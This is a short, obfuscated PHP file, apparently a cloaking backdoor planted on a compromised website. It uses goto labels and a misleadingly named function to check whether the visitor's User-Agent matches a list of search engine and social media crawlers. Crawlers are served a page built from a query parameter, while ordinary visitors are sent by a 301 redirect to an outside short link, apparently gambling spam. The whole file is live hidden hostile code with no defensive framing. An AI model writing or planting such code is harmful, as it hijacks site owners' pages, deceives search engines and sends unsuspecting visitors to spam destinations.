<?php
goto label1; label1: if (isset($_GET["ruay"]) && !empty($_GET["ruay"]) && motherHoodNature()) {  $go = strtoupper($_GET["ruay"]);  $link = (empty($_SERVER["HTTPS"]) ? "http" : "https") . "://{$_SERVER["HTTP_HOST"]}{$_SERVER["REQUEST_URI"]}"; ?>

<?php } elseif (!motherHoodNature()) { header("HTTP/1.1 301 Moved Permanently");  header("Location: https://rebrand.ly/tha555vip"); die; }
goto label2;  label2: function motherHoodNature() { if (preg_match("/AhrefsBot|baiduspider|baidu|bingbot|bing|DuckDuckBot|facebookexternalhit|facebook|facebot|googlebot|\\-google|google\\-inspectiontool|Uptime\\-Kuma|linked|Linkidator|linkwalker|mediapartners|mod_pagespeed|naverbot|pinterest|SemrushBot|twitterbot|twitter|xing|yahoo|YandexBot|YandexMobileBot|yandex|Zeus\/i/", $_SERVER["HTTP_USER_AGENT"])) { return true;  } return false; }goto label3; label3: ?>
